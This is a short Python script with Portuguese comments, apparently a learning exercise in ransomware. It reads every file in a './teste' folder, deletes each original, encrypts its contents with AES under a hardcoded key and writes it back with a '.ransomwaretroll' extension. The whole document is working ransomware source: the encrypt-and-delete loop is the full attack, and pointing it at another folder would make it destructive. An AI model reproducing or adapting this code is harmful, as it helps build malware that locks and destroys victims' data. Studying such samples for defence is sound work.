import os
import pyaes

## pega todos os arquivos do diretório teste
arquivos = os.listdir("./teste")

## abrir a pasta com os arquivos a serem criptografados
for arquivo in arquivos:
    ##seta variavel com o nome do arquivo e extensão
    filename, file_extension = os.path.splitext(arquivo)
    ##seta pasta+nome completo do arquivo
    file_name= "./teste/" + str(filename +file_extension)
    #print(file_name)
    #abre arquivo
    file = open(file_name, "rb")
    #Lê arquivo
    file_data = file.read()
    #Fecha arquivo arquivo
    file.close()
    ## remover o arquivo
    os.remove(file_name)

    ## chave de criptografia
    key = b"testeransomwares"
    aes = pyaes.AESModeOfOperationCTR(key)
    ##encripta arquivo
    crypto_data = aes.encrypt(file_data)

    ## salvar o arquivo criptografado
    new_file = "./teste/" + filename + ".ransomwaretroll"
    new_file = open(f'{new_file}','wb')
    new_file.write(crypto_data)
    new_file.close()
